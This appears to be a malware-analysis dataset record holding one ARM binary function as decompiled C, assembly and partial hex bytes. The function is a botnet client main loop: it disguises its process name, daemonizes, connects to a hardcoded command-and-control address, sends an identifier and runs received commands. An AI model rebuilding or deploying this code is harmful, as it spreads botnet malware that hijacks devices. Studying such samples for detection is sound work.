V\u000a/* WARNING: Could not reconcile some variable overlaps */\u000a\u000aundefined4 FUN_00009bac(int iParm1,undefined4 *puParm2)\u000a\u000a{\u000a  undefined *puVar1;\u000a  undefined *__addr;\u000a  undefined *puVar2;\u000a  undefined *puVar3;\u000a  byte bVar4;\u000a  undefined4 uVar5;\u000a  int __fd;\u000a  int iVar6;\u000a  void *__buf;\u000a  __pid_t _Var7;\u000a  uint __n;\u000a  uint *puVar8;\u000a  ssize_t sVar9;\u000a  int extraout_r1;\u000a  int extraout_r1_00;\u000a  uint uVar10;\u000a  sigset_t *__set;\u000a  undefined4 uVar11;\u000a  int iVar12;\u000a  undefined auStack1416 [1024];\u000a  uint local_188 [32];\u000a  uint local_108 [32];\u000a  undefined auStack136 [32];\u000a  undefined auStack104 [32];\u000a  timeval local_48 [2];\u000a  socklen_t local_38;\u000a  ulong local_34;\u000a  size_t local_30;\u000a  ushort local_2a;\u000a  \u000a  __set = (sigset_t *)(local_48 + 1);\u000a  local_30 = 0;\u000a  sigemptyset(__set);\u000a  sigaddset(__set,2);\u000a  sigprocmask(0,__set,(sigset_t *)0x0);\u000a  signal(0x11,(__sighandler_t)0x1);\u000a  signal(5,(__sighandler_t)PTR_LAB_0000a2d8);\u000a  uVar5 = FUN_0000ade8();\u000a  puVar1 = PTR_DAT_0000a2dc;\u000a  *(undefined2 *)(PTR_DAT_0000a2dc + 2) = 0x7f59;\u000a  *(undefined4 *)PTR_DAT_0000a2e0 = uVar5;\u000a  *(undefined4 *)(puVar1 + 4) = 0x3e0bd9b9;\u000a  *(undefined2 *)puVar1 = 2;\u000a  FUN_0000a6dc();\u000a  *(undefined **)PTR_PTR_FUN_0000a2e8 = PTR_FUN_0000a2e4;\u000a  FUN_0000a364();\u000a  FUN_0000ac88(auStack136,0x20);\u000a  if ((iParm1 == 2) && (__fd = FUN_0000abf4(puParm2[1]), __fd < 0x20)) {\u000a    FUN_0000ac1c(auStack136,puParm2[1]);\u000a    uVar11 = puParm2[1];\u000a    uVar5 = FUN_0000abf4(uVar11);\u000a    FUN_0000ac88(uVar11,uVar5);\u000a  }\u000a  uVar5 = FUN_0000a308();\u000a  __fd = FUN_0000abf4(*puParm2);\u000a  iVar6 = FUN_0000abf4(*puParm2);\u000a  FUN_0000af78(uVar5,0x14 - __fd);\u000a  FUN_0000a3cc(auStack104,iVar6 + extraout_r1);\u000a  iVar12 = 0;\u000a  uVar5 = *puParm2;\u000a  auStack104[iVar6 + extraout_r1] = 0;\u000a  FUN_0000ac1c(uVar5,auStack104);\u000a  FUN_0000ac88(auStack104,0x20);\u000a  uVar5 = FUN_0000a308();\u000a  __fd = FUN_0000abf4(*puParm2);\u000a  iVar6 = FUN_0000abf4(*puParm2);\u000a  FUN_0000af78(uVar5,0x14 - __fd);\u000a  FUN_0000a3cc(auStack104,iVar6 + extraout_r1_00);\u000a  auStack104[iVar6 + extraout_r1_00] = 0;\u000a  prctl(0xf,auStack104);\u000a  FUN_0000a63c(3);\u000a  __buf = (void *)FUN_0000a578(3,&local_30);\u000a  write(1,__buf,local_30);\u000a  write(1,PTR_DAT_0000a2ec,1);\u000a  FUN_0000a59c(3);\u000a  FUN_00009a5c();\u000a  FUN_00008f1c();\u000a  _Var7 = fork();\u000a  if (0 < _Var7) {\u000a    return 0;\u000a  }\u000a  setsid();\u000a  close(0);\u000a  close(1);\u000a  close(2);\u000a  FUN_00009a5c();\u000a  FUN_00008f1c();\u000a  puVar3 = PTR_DAT_0000a2f4;\u000a  puVar1 = PTR_DAT_0000a2f0;\u000a  do {\u000a    while( true ) {\u000a      do {\u000a        while( true ) {\u000a          do {\u000a            local_108[0] = 0;\u000a            __fd = 4;\u000a            do {\u000a              iVar6 = __fd;\u000a              *(undefined4 *)((int)((fd_set *)local_108)->fds_bits + iVar6) = 0;\u000a              __fd = iVar6 + 4;\u000a            } while (iVar6 + 4 != 0x80);\u000a            local_188[0] = 0;\u000a            iVar6 = iVar6 + -0x78;\u000a            do {\u000a              *(undefined4 *)((int)((fd_set *)local_188)->fds_bits + iVar6) = 0;\u000a              iVar6 = iVar6 + 4;\u000a            } while (iVar6 != 0x80);\u000a            __n = *(uint *)PTR_DAT_0000a2f8;\u000a            if (__n != 0xffffffff) {\u000a              local_108[__n >> 5] = local_108[__n >> 5] | 1 << (__n & 0x1f);\u000a            }\u000a            puVar2 = PTR_DAT_0000a2f0;\u000a            if (*(int *)puVar1 == -1) {\u000a              __fd = socket(2,1,0);\u000a              *(int *)puVar2 = __fd;\u000a              if (__fd != -1) {\u000a                __n = fcntl(__fd,3,0);\u000a                fcntl(__fd,4,__n | 0x800);\u000a                if (*(code **)PTR_PTR_FUN_0000a2e8 != (code *)0x0) {\u000a                  (**(code **)PTR_PTR_FUN_0000a2e8)();\u000a                }\u000a                __addr = PTR_DAT_0000a2dc;\u000a                __fd = *(int *)puVar2;\u000a                *puVar3 = 1;\u000a                connect(__fd,(sockaddr *)__addr,0x10);\u000a              }\u000a            }\u000a            if (*puVar3 == 0) {\u000a              __n = *(uint *)puVar1;\u000a              local_108[__n >> 5] = local_108[__n >> 5] | 1 << (__n & 0x1f);\u000a            }\u000a            else {\u000a              __n = *(uint *)puVar1;\u000a              local_188[__n >> 5] = local_188[__n >> 5] | 1 << (__n & 0x1f);\u000a            }\u000a            if ((int)__n < (int)*(uint *)PTR_DAT_0000a2f8) {\u000a              __n = *(uint *)PTR_DAT_0000a2f8;\u000a            }\u000a            local_48[0].tv_sec = 10;\u000a            local_48[0].tv_usec = 0;\u000a            __fd = select(__n + 1,(fd_set *)local_108,(fd_set *)local_188,(fd_set *)0x0,local_48);\u000a          } while (__fd == -1);\u000a          if (__fd == 0) {\u000a            __fd = iVar12 + ((int)((ulonglong)((longlong)iVar12 * (longlong)DAT_0000a2fc) >> 0x20) -\u000a                            (iVar12 >> 0x1f)) * -6;\u000a            local_2a = 0;\u000a            iVar12 = iVar12 + 1;\u000a            if (__fd == 0) {\u000a              send(*(int *)puVar1,&local_2a,2,0x4000);\u000a            }\u000a          }\u000a          puVar2 = PTR_DAT_0000a2f0;\u000a          bVar4 = *puVar3;\u000a          if (bVar4 == 0) break;\u000a          __n = *(uint *)puVar1;\u000a          uVar10 = local_188[__n >> 5];\u000a          *PTR_DAT_0000a2f4 = 0;\u000a          puVar2 = PTR_DAT_0000a2f0;\u000a          if (((int)uVar10 >> (__n & 0x1f) & 1U) == 0) {\u000a            if (__n != 0xffffffff) {\u000a              close(__n);\u000a            }\u000a            *(undefined4 *)puVar2 = 0xffffffff;\u000a            sleep(1);\u000a          }\u000a          else {\u000a            local_34 = 0;\u000a            local_38 = 4;\u000a            getsockopt(__n,1,4,&local_34,&local_38);\u000a            if (local_34 == 0) {\u000a              bVar4 = FUN_0000abf4(auStack136);\u000a              local_2a = local_2a & 0xff00 | (ushort)bVar4;\u000a              uVar5 = FUN_0000ade8();\u000a              *(undefined4 *)PTR_DAT_0000a2e0 = uVar5;\u000a              send(*(int *)puVar2,PTR_DAT_0000a304,4,0x4000);\u000a              send(*(int *)puVar2,&local_2a,1,0x4000);\u000a              if ((byte)local_2a != 0) {\u000a                send(*(int *)puVar2,auStack136,(uint)(byte)local_2a,0x4000);\u000a              }\u000a            }\u000a            else {\u000a              close(*(int *)puVar2);\u000a              *(undefined4 *)puVar2 = 0xffffffff;\u000a              __n = FUN_0000a308();\u000a              uVar10 = (uint)((ulonglong)__n * (ulonglong)DAT_0000a300 >> 0x20);\u000a              sleep((__n - ((uVar10 >> 3) * 2 + (uVar10 & 0xfffffff8))) + 1);\u000a            }\u000a          }\u000a        }\u000a        __n = *(uint *)puVar1;\u000a      } while ((__n == 0xffffffff) || (((int)local_108[__n >> 5] >> (__n & 0x1f) & 1U) == 0));\u000a      local_2a = 0;\u000a      puVar8 = (uint *)__errno_location();\u000a      *puVar8 = (uint)bVar4;\u000a      sVar9 = recv(*(int *)puVar2,&local_2a,2,0x4002);\u000a      if (sVar9 == -1) break;\u000a      if (sVar9 == 0) goto LAB_0000a218;\u000a      if (local_2a == 0) {\u000a        recv(*(int *)puVar2,&local_2a,2,(uint)local_2a + 0x4000);\u000a      }\u000a      else {\u000a        __n = (uint)(local_2a >> 8) | ((uint)local_2a & 0xff) << 8;\u000a        local_2a = (ushort)__n;\u000a        if (__n < 0x401) {\u000a          *puVar8 = (uint)bVar4;\u000a          sVar9 = recv(*(int *)puVar2,auStack1416,__n,0x4002);\u000a          if (sVar9 == -1) break;\u000a          if (sVar9 == 0) goto LAB_0000a218;\u000a          recv(*(int *)puVar2,&local_2a,2,0x4000);\u000a          __n = (uint)(local_2a >> 8) | ((uint)local_2a & 0xff) << 8;\u000a          local_2a = (ushort)__n;\u000a          recv(*(int *)puVar2,auStack1416,__n,0x4000);\u000a          if (local_2a != 0) {\u000a            FUN_00008c24(auStack1416);\u000a          }\u000a        }\u000a        else {\u000a          close(*(int *)puVar2);\u000a          *(undefined4 *)puVar2 = 0xffffffff;\u000a        }\u000a      }\u000a    }\u000a    if (*puVar8 != 4 && *puVar8 != 0xb) {\u000aLAB_0000a218:\u000a      if (*(int *)puVar1 != -1) {\u000a        close(*(int *)puVar1);\u000a      }\u000a      *(undefined4 *)PTR_DAT_0000a2f0 = 0xffffffff;\u000a      sleep(1);\u000a    }\u000a  } while( true );\u000a}\u000a\u000a
p374
S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\nsub sp,sp,#0x560\nsub sp,sp,#0xc\nadd r4,sp,#0x550\nmov r5,#0x0\ncpy r6,r0\ncpy r0,r4\ncpy r8,r1\nstr r5,[sp,#0x560]\nbl 0x000088f0\nmov r1,#0x2\ncpy r0,r4\nbl 0x00008944\ncpy r2,r5\ncpy r1,r4\ncpy r0,r5\nbl 0x00008a7c\nmov r1,#0x1\nmov r0,#0x11\nbl 0x000089b0\nldr r1,[0xa2d8]\nmov r0,#0x5\nbl 0x000089b0\nbl 0x0000ade8\nldr r1,[0xa2dc]\nmov r3,#0x7f00\nadd r3,r3,#0x59\nmvn r2,#0x2640\nstrh r3,[r1,#0x2]\nsub r2,r2,#0xc0000006\nldr r3,[0xa2e0]\nsub r2,r2,#0x1f40000\nmov r12,#0x2\nstr r0,[r3,#0x0]\nstr r2,[r1,#0x4]\nstrh r12,[r1,#0x0]\nbl 0x0000a6dc\nldr r3,[0xa2e4]\nldr lr,[0xa2e8]\nstr r3,[lr,#0x0]\nbl 0x0000a364\nadd r0,sp,#0x500\nadd r0,r0,#0x8\nmov r1,#0x20\nbl 0x0000ac88\ncmp r6,#0x2\nbeq 0x00009d94\nbl 0x0000a308\ncpy r6,r0\nldr r0,[r8,#0x0]\nbl 0x0000abf4\ncpy r5,r0\nldr r0,[r8,#0x0]\nbl 0x0000abf4\nrsb r1,r5,#0x14\ncpy r4,r0\ncpy r0,r6\nbl 0x0000af78\nadd r5,sp,#0x520\nadd r5,r5,#0x8\nadd r4,r4,r1\ncpy r1,r4\ncpy r0,r5\nbl 0x0000a3cc\nadd r1,sp,#0x560\nadd r1,r1,#0x8\nadd r3,r1,r4\nmov r9,#0x0\ncpy r1,r5\nldr r0,[r8,#0x0]\nstrb r9,[r3,#-0x40]\nbl 0x0000ac1c\nmov r1,#0x20\ncpy r0,r5\nbl 0x0000ac88\nbl 0x0000a308\ncpy r7,r0\nldr r0,[r8,#0x0]\nbl 0x0000abf4\ncpy r6,r0\nldr r0,[r8,#0x0]\nbl 0x0000abf4\nrsb r1,r6,#0x14\ncpy r4,r0\ncpy r0,r7\nbl 0x0000af78\nadd r4,r4,r1\ncpy r0,r5\ncpy r1,r4\nbl 0x0000a3cc\nadd r2,sp,#0x560\nadd r2,r2,#0x8\nadd r3,r2,r4\nstrb r9,[r3,#-0x40]\ncpy r1,r5\nmov r0,#0xf\nbl 0x00008908\nmov r0,#0x3\nbl 0x0000a63c\nadd r1,sp,#0x560\nmov r0,#0x3\nbl 0x0000a578\nldr r2,[sp,#0x560]\ncpy r1,r0\nmov r0,#0x1\nbl 0x00008974\nmov r0,#0x1\nldr r1,[0xa2ec]\ncpy r2,r0\nbl 0x00008974\nmov r0,#0x3\nbl 0x0000a59c\nbl 0x00009a5c\nbl 0x00008f1c\nbl 0x000089d4\ncmp r0,r9\nble 0x00009dd0\ncpy r0,r9\nadd sp,sp,#0x16c\nadd sp,sp,#0x400\nldmia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\nbx lr\nldr r0,[r8,#0x4]\nbl 0x0000abf4\ncmp r0,#0x1f\nbgt 0x00009c68\nadd r0,sp,#0x500\nldr r1,[r8,#0x4]\nadd r0,r0,#0x8\nbl 0x0000ac1c\nldr r4,[r8,#0x4]\ncpy r0,r4\nbl 0x0000abf4\ncpy r1,r0\ncpy r0,r4\nbl 0x0000ac88\nb 0x00009c68\nbl 0x00008a40\ncpy r0,r9\nbl 0x00008a58\nmov r0,#0x1\nbl 0x00008a58\nmov r0,#0x2\nbl 0x00008a58\nbl 0x00009a5c\nbl 0x00008f1c\nadd r6,sp,#0x480\nadd r7,sp,#0x400\nldr r10,[0xa2f0]\nldr r11,[0xa2f4]\nadd r6,r6,#0x8\nadd r7,r7,#0x8\nmov r3,#0x0\nstr r3,[sp,#0x488]\nadd r3,r3,#0x4\nmov r2,#0x0\nstr r2,[r3,r6]\nadd r3,r3,#0x4\ncmp r3,#0x80\nbne 0x00009e18\nstr r2,[sp,#0x408]\nsub r3,r3,#0x7c\nmov r4,#0x0\nstr r4,[r3,r7]\nadd r3,r3,#0x4\ncmp r3,#0x80\nbne 0x00009e34\nldr r3,[0xa2f8]\nldr r0,[r3,#0x0]\ncmn r0,#0x1\nbeq 0x00009e80\nmov r3,r0, lsr #0x5\nadd r12,sp,#0x560\nmov r3,r3, lsl #0x2\nadd r12,r12,#0x8\nadd r3,r3,r12\nldr r2,[r3,#-0xe0]\nand r0,r0,#0x1f\nmov r1,#0x1\norr r2,r2,r1, lsl r0\nstr r2,[r3,#-0xe0]\nldr r3,[r10,#0x0]\ncmn r3,#0x1\nldr r8,[0xa2f0]\nbeq 0x0000a10c\nldrb r3,[r11,#0x0]\ncmp r3,#0x0\nbeq 0x00009fac\nldr r12,[r10,#0x0]\nadd r1,sp,#0x560\nmov r3,r12, lsr #0x5\nadd r1,r1,#0x8\nmov r3,r3, lsl #0x2\nadd r3,r3,r1\nldr r2,[r3,#-0x160]\nand r0,r12,#0x1f\nmov r1,#0x1\norr r2,r2,r1, lsl r0\nstr r2,[r3,#-0x160]\nldr r3,[0xa2f8]\nldr r0,[r3,#0x0]\ncmp r12,r0\ncpyge r0,r12\ncpylt r0,r0\nmov r12,#0xa\nmov lr,#0x0\nstr r12,[sp,#0x548]\nadd r12,sp,#0x540\nadd r12,r12,#0x8\nadd r0,r0,#0x1\ncpy r3,lr\ncpy r1,r6\ncpy r2,r7\nstr lr,[sp,#0x54c]\nstr r12,[sp,#0x0]\nbl 0x00008938\ncmn r0,#0x1\nbeq 0x00009e0c\ncmp r0,#0x0\nbne 0x00009f48\nldr r3,[0xa2fc]\nsmull lr,r2,r3,r9\nsub r2,r2,r9, asr #0x1f\nmov r3,r2, lsl #0x3\nsub r3,r3,r2, lsl #0x1\nrsb r2,r3,r9\nadd r1,sp,#0x500\ncmp r2,#0x0\nstrh r0,[r1,#0x66]\nadd r9,r9,#0x1\nbeq 0x0000a1ec\nldrb r4,[r11,#0x0]\ncmp r4,#0x0\nbeq 0x00009fdc\nldr r0,[r10,#0x0]\nadd r2,sp,#0x560\nmov r3,r0, lsr #0x5\nadd r2,r2,#0x8\nmov r3,r3, lsl #0x2\nadd r3,r3,r2\nldr r2,[r3,#-0x160]\nand r1,r0,#0x1f\nmov r2,r2, asr r1\nldr r3,[0xa2f4]\nmov r12,#0x0\ntst r2,#0x1\nstrb r12,[r3,#0x0]\nldr r4,[0xa2f0]\nbne 0x0000a178\ncmn r0,#0x1\nblne 0x00008a58\nmvn r3,#0x0\nstr r3,[r4,#0x0]\nmov r0,#0x1\nbl 0x00008920\nb 0x00009e0c\nldr r12,[r10,#0x0]\nadd r2,sp,#0x560\nmov r3,r12, lsr #0x5\nadd r2,r2,#0x8\nmov r3,r3, lsl #0x2\nadd r3,r3,r2\nldr r2,[r3,#-0xe0]\nand r0,r12,#0x1f\nmov r1,#0x1\norr r2,r2,r1, lsl r0\nstr r2,[r3,#-0xe0]\nb 0x00009ec8\nldr r1,[r10,#0x0]\ncmn r1,#0x1\nldr r8,[0xa2f0]\nbeq 0x00009e0c\nmov r3,r1, lsr #0x5\nadd r2,sp,#0x560\nadd r2,r2,#0x8\nmov r3,r3, lsl #0x2\nadd r3,r3,r2\nldr r2,[r3,#-0xe0]\nand r1,r1,#0x1f\nmov r2,r2, asr r1\ntst r2,#0x1\nbeq 0x00009e0c\nadd r3,sp,#0x500\nstrh r4,[r3,#0x66]\nbl 0x00008a10\nstr r4,[r0,#0x0]\nmov r3,#0x4000\nadd r1,sp,#0x560\ncpy r5,r0\nadd r3,r3,#0x2\nldr r0,[r8,#0x0]\nadd r1,r1,#0x6\nmov r2,#0x2\nbl 0x000088d8\ncmn r0,#0x1\nbeq 0x0000a208\ncmp r0,#0x0\nbeq 0x0000a218\nadd r12,sp,#0x500\nldrh r3,[r12,#0x66]\ncmp r3,#0x0\nbeq 0x0000a2a8\nmov r2,r3, lsr #0x8\nand r3,r3,#0xff\norr r2,r2,r3, lsl #0x8\nadd lr,sp,#0x500\ncmp r2,#0x400\nstrh r2,[lr,#0x66]\nbhi 0x0000a2c4\nstr r4,[r5,#0x0]\nmov r3,#0x4000\nadd r3,r3,#0x2\nldr r0,[r8,#0x0]\nadd r1,sp,#0x8\nbl 0x000088d8\ncmn r0,#0x1\nbeq 0x0000a208\ncmp r0,#0x0\nbeq 0x0000a218\nadd r1,sp,#0x560\nadd r1,r1,#0x6\nmov r2,#0x2\nmov r3,#0x4000\nldr r0,[r8,#0x0]\nbl 0x000088d8\nadd r1,sp,#0x500\nldrh r3,[r1,#0x66]\nmov r12,r3, lsr #0x8\nand r3,r3,#0xff\norr r12,r12,r3, lsl #0x8\nadd lr,sp,#0x500\ncpy r2,r12\nadd r1,sp,#0x8\nldr r0,[r8,#0x0]\nmov r3,#0x4000\nstrh r12,[lr,#0x66]\nbl 0x000088d8\nadd r2,sp,#0x500\nldrh r1,[r2,#0x66]\ncmp r1,#0x0\nbeq 0x00009e0c\nadd r0,sp,#0x8\nbl 0x00008c24\nb 0x00009e0c\nmov r0,#0x2\nmov r1,#0x1\ncpy r2,r4\nbl 0x0000892c\ncmn r0,#0x1\ncpy r5,r0\nstr r0,[r8,#0x0]\nbeq 0x00009e90\ncpy r2,r4\nmov r1,#0x3\nbl 0x00008a4c\nmov r1,#0x4\norr r2,r0,#0x800\ncpy r0,r5\nbl 0x00008a4c\nldr lr,[0xa2e8]\nldr r3,[lr,#0x0]\ncmp r3,#0x0\ncpyne lr,pc\nbxne r3\nmov r3,#0x1\nldr r0,[r8,#0x0]\nldr r1,[0xa2dc]\nmov r2,#0x10\nstrb r3,[r11,#0x0]\nbl 0x000088e4\nb 0x00009e90\nmov r5,#0x4\nstr r12,[sp,#0x55c]\nadd r3,sp,#0x550\nadd r12,sp,#0x550\nadd r3,r3,#0xc\nadd r12,r12,#0x8\nmov r1,#0x1\ncpy r2,r5\nstr r5,[sp,#0x558]\nstr r12,[sp,#0x0]\nbl 0x00008a04\nldr r3,[sp,#0x55c]\ncmp r3,#0x0\nbeq 0x0000a23c\nldr r0,[r4,#0x0]\nbl 0x00008a58\nmvn r3,#0x0\nstr r3,[r4,#0x0]\nbl 0x0000a308\nldr r2,[0xa300]\numull lr,r3,r2,r0\nmov r3,r3, lsr #0x3\nmov r2,r3, lsl #0x3\nmov r3,r3, lsl #0x1\nadd r3,r3,r2\nrsb r0,r3,r0\nadd r0,r0,#0x1\nbl 0x00008920\nb 0x00009e0c\nadd r1,sp,#0x560\nldr r0,[r10,#0x0]\nadd r1,r1,#0x6\nadd r2,r2,#0x2\nmov r3,#0x4000\nbl 0x00008950\nb 0x00009f48\nldr r3,[r5,#0x0]\ncmp r3,#0x4\ncmpne r3,#0xb\nbeq 0x00009e0c\nldr r0,[r10,#0x0]\ncmn r0,#0x1\nblne 0x00008a58\nldr r3,[0xa2f0]\nmvn r2,#0x0\nstr r2,[r3,#0x0]\nmov r0,#0x1\nbl 0x00008920\nb 0x00009e0c\nadd r0,sp,#0x500\nadd r0,r0,#0x8\nbl 0x0000abf4\nstrb r0,[sp,#0x566]\nbl 0x0000ade8\nldr r1,[0xa2e0]\ncpy r2,r5\nstr r0,[r1,#0x0]\nmov r3,#0x4000\nldr r1,[0xa304]\nldr r0,[r4,#0x0]\nbl 0x00008950\nadd r1,sp,#0x560\nmov r2,#0x1\nldr r0,[r4,#0x0]\nadd r1,r1,#0x6\nmov r3,#0x4000\nbl 0x00008950\nldrb r2,[sp,#0x566]\ncmp r2,#0x0\nbeq 0x00009e0c\nadd r1,sp,#0x500\nldr r0,[r4,#0x0]\nadd r1,r1,#0x8\nmov r3,#0x4000\nbl 0x00008950\nb 0x00009e0c\nadd r1,sp,#0x560\nldr r0,[r8,#0x0]\nadd r1,r1,#0x6\nmov r2,#0x2\nadd r3,r3,#0x4000\nbl 0x000088d8\nb 0x00009e0c\nldr r0,[r8,#0x0]\nbl 0x00008a58\nmvn r3,#0x0\nstr r3,[r8,#0x0]\nb 0x00009e0c\n'
p375
S'f0 4f 2d e9\n56 de 4d e2\n0c d0 4d e2\n55 4e 8d e2\n00 50 a0 e3\n00 60 a0 e1\n04 00 a0 e1\n01 80 a0 e1\n60 55 8d e5\n46 fb ff eb\n02 10 a0 e3\n04 00 a0 e1\n58 fb ff eb\n05 20 a0 e1\n04 10 a0 e1\n05 00 a0 e1\na2 fb ff eb\n01 10 a0 e3\n11 00 a0 e3\n6c fb ff eb\nd4 16 9f e5\n05 00 a0 e3\n69 fb ff eb\n76 04 00 eb\nc8 16 9f e5\n7f 3c a0 e3\n59 30 83 e2\n99 2d e0 e3\nb2 30 c1 e1\n1b 21 42 e2\nb4 36 9f e5\n7d 27 42 e2\n02 c0 a0 e3\n00 00 83 e5\n04 20 81 e5\nb0 c0 c1 e1\na6 02 00 eb\n9c 36 9f e5\n9c e6 9f e5\n00 30 8e e5\nc4 01 00 eb\n05 0c 8d e2\n08 00 80 e2\n20 10 a0 e3\n09 04 00 eb\n02 00 56 e3\n4a 00 00 0a\na6 01 00 eb\n00 60 a0 e1\n00 00 98 e5\nde 03 00 eb\n00 50 a0 e1\n00 00 98 e5\ndb 03 00 eb\n14 10 65 e2\n00 40 a0 e1\n06 00 a0 e1\nb8 04 00 eb\n52 5e 8d e2\n08 50 85 e2\n01 40 84 e0\n04 10 a0 e1\n05 00 a0 e1\nc7 01 00 eb\n56 1e 8d e2\n08 10 81 e2\n04 30 81 e0\n00 90 a0 e3\n05 10 a0 e1\n00 00 98 e5\n40 90 43 e5\nd3 03 00 eb\n20 10 a0 e3\n05 00 a0 e1\neb 03 00 eb\n8a 01 00 eb\n00 70 a0 e1\n00 00 98 e5\nc2 03 00 eb\n00 60 a0 e1\n00 00 98 e5\nbf 03 00 eb\n14 10 66 e2\n00 40 a0 e1\n07 00 a0 e1\n9c 04 00 eb\n01 40 84 e0\n05 00 a0 e1\n04 10 a0 e1\nad 01 00 eb\n56 2e 8d e2\n08 20 82 e2\n04 30 82 e0\n40 90 43 e5\n05 10 a0 e1\n0f 00 a0 e3\nf5 fa ff eb\n03 00 a0 e3\n40 02 00 eb\n56 1e 8d e2\n03 00 a0 e3\n0c 02 00 eb\n60 25 9d e5\n00 10 a0 e1\n01 00 a0 e3\n07 fb ff eb\n01 00 a0 e3\n8c 15 9f e5\n00 20 a0 e1\n03 fb ff eb\n03 00 a0 e3\n0b 02 00 eb\n3a ff ff eb\n69 fc ff eb\n16 fb ff eb\n09 00 50 e1\n13 00 00 da\n09 00 a0 e1\n5b df 8d e2\n01 db 8d e2\nf0 4f bd e8\n1e ff 2f e1\n04 00 98 e5\n95 03 00 eb\n1f 00 50 e3\nb0 ff ff ca\n05 0c 8d e2\n04 10 98 e5\n08 00 80 e2\n99 03 00 eb\n04 40 98 e5\n04 00 a0 e1\n8c 03 00 eb\n00 10 a0 e1\n04 00 a0 e1\nae 03 00 eb\na5 ff ff ea\n1a fb ff eb\n09 00 a0 e1\n1e fb ff eb\n01 00 a0 e3\n1c fb ff eb\n02 00 a0 e3\n1a fb ff eb\n1a ff ff eb\n49 fc ff eb\n12 6d 8d e2\n01 7b 8d e2\nec a4 9f e5\nec b4 9f e5\n08 60 86 e2\n08 70 87 e2\n00 30 a0 e3\n88 34 8d e5\n04 30 83 e2\n00 20 a0 e3\n06 20 83 e7\n04 30 83 e2\n80 00 53 e3\nfa ff ff 1a\n08 24 8d e5\n7c 30 43 e2\n00 40 a0 e3\n07 40 83 e7\n04 30 83 e2\n80 00 53 e3\nfa ff ff 1a\na8 34 9f e5\n00 00 93 e5\n01 00 70 e3\n09 00 00 0a\na0 32 a0 e1\n56 ce 8d e2\n03 31 a0 e1\n08 c0 8c e2\n0c 30 83 e0\ne0 20 13 e5\n1f 00 00 e2\n01 10 a0 e3\n11 20 82 e1\ne0 20 03 e5\n00 30 9a e5\n01 00 73 e3\n60 84 9f e5\n9e 00 00 0a\n00 30 db e5\n00 00 53 e3\n43 00 00 0a\n00 c0 9a e5\n56 1e 8d e2\nac 32 a0 e1\n08 10 81 e2\n03 31 a0 e1\n01 30 83 e0\n60 21 13 e5\n1f 00 0c e2\n01 10 a0 e3\n11 20 82 e1\n60 21 03 e5\n28 34 9f e5\n00 00 93 e5\n00 00 5c e1\n0c 00 a0 a1\n00 00 a0 b1\n0a c0 a0 e3\n00 e0 a0 e3\n48 c5 8d e5\n15 cd 8d e2\n08 c0 8c e2\n01 00 80 e2\n0e 30 a0 e1\n06 10 a0 e1\n07 20 a0 e1\n4c e5 8d e5\n00 c0 8d e5\n8a fa ff eb\n01 00 70 e3\nbd ff ff 0a\n00 00 50 e3\n0a 00 00 1a\nd8 33 9f e5\n93 e9 c2 e0\nc9 2f 42 e0\n82 31 a0 e1\n82 30 43 e0\n09 20 63 e0\n05 1c 8d e2\n00 00 52 e3\nb6 06 c1 e1\n01 90 89 e2\na8 00 00 0a\n00 40 db e5\n00 00 54 e3\n21 00 00 0a\n00 00 9a e5\n56 2e 8d e2\na0 32 a0 e1\n08 20 82 e2\n03 31 a0 e1\n02 30 83 e0\n60 21 13 e5\n1f 10 00 e2\n52 21 a0 e1\n74 33 9f e5\n00 c0 a0 e3\n01 00 12 e3\n00 c0 c3 e5\n60 43 9f e5\n79 00 00 1a\n01 00 70 e3\naf fa ff 1b\n00 30 e0 e3\n00 30 84 e5\n01 00 a0 e3\n5d fa ff eb\n97 ff ff ea\n00 c0 9a e5\n56 2e 8d e2\nac 32 a0 e1\n08 20 82 e2\n03 31 a0 e1\n02 30 83 e0\ne0 20 13 e5\n1f 00 0c e2\n01 10 a0 e3\n11 20 82 e1\ne0 20 03 e5\nba ff ff ea\n00 10 9a e5\n01 00 71 e3\n04 83 9f e5\n87 ff ff 0a\na1 32 a0 e1\n56 2e 8d e2\n08 20 82 e2\n03 31 a0 e1\n02 30 83 e0\ne0 20 13 e5\n1f 10 01 e2\n52 21 a0 e1\n01 00 12 e3\n7d ff ff 0a\n05 3c 8d e2\nb6 46 c3 e1\n7b fa ff eb\n00 40 80 e5\n01 39 a0 e3\n56 1e 8d e2\n00 50 a0 e1\n02 30 83 e2\n00 00 98 e5\n06 10 81 e2\n02 20 a0 e3\n24 fa ff eb\n01 00 70 e3\n6e 00 00 0a\n00 00 50 e3\n70 00 00 0a\n05 cc 8d e2\nb6 36 dc e1\n00 00 53 e3\n90 00 00 0a\n23 24 a0 e1\nff 30 03 e2\n03 24 82 e1\n05 ec 8d e2\n01 0b 52 e3\nb6 26 ce e1\n90 00 00 8a\n00 40 85 e5\n01 39 a0 e3\n02 30 83 e2\n00 00 98 e5\n08 10 8d e2\n0f fa ff eb\n01 00 70 e3\n59 00 00 0a\n00 00 50 e3\n5b 00 00 0a\n56 1e 8d e2\n06 10 81 e2\n02 20 a0 e3\n01 39 a0 e3\n00 00 98 e5\n05 fa ff eb\n05 1c 8d e2\nb6 36 d1 e1\n23 c4 a0 e1\nff 30 03 e2\n03 c4 8c e1\n05 ec 8d e2\n0c 20 a0 e1\n08 10 8d e2\n00 00 98 e5\n01 39 a0 e3\nb6 c6 ce e1\nf9 f9 ff eb\n05 2c 8d e2\nb6 16 d2 e1\n00 00 51 e3\n42 ff ff 0a\n08 00 8d e2\nc6 fa ff eb\n3f ff ff ea\n02 00 a0 e3\n01 10 a0 e3\n04 20 a0 e1\n03 fa ff eb\n01 00 70 e3\n00 50 a0 e1\n00 00 88 e5\n58 ff ff 0a\n04 20 a0 e1\n03 10 a0 e3\n44 fa ff eb\n04 10 a0 e3\n02 2b 80 e3\n05 00 a0 e1\n40 fa ff eb\n98 e1 9f e5\n00 30 9e e5\n00 00 53 e3\n0f e0 a0 11\n13 ff 2f 11\n01 30 a0 e3\n00 00 98 e5\n70 11 9f e5\n10 20 a0 e3\n00 30 cb e5\ndb f9 ff eb\n45 ff ff ea\n04 50 a0 e3\n5c c5 8d e5\n55 3e 8d e2\n55 ce 8d e2\n0c 30 83 e2\n08 c0 8c e2\n01 10 a0 e3\n05 20 a0 e1\n58 55 8d e5\n00 c0 8d e5\n17 fa ff eb\n5c 35 9d e5\n00 00 53 e3\n22 00 00 0a\n00 00 94 e5\n27 fa ff eb\n00 30 e0 e3\n00 30 84 e5\n50 00 00 eb\n34 21 9f e5\n92 e0 83 e0\na3 31 a0 e1\n83 21 a0 e1\n83 30 a0 e1\n02 